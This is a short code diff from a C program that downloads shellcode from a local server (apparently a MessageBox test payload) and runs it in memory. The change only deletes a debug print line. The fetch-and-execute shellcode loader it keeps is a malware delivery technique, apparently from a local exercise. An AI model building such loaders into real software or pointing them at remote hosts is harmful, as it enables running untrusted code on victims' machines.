@@ -21,7 +21,6 @@ int main() {
     unsigned char* shellcode = malloc(400000);
     size_t shellcodeSize = 400000;
     fetch_url("http://localhost:3000/MessageBoxShellcode", shellcode, &shellcodeSize);
-    printf("%s", shellcode);
     execute_shellcode(shellcode, shellcodeSize);
 }
 
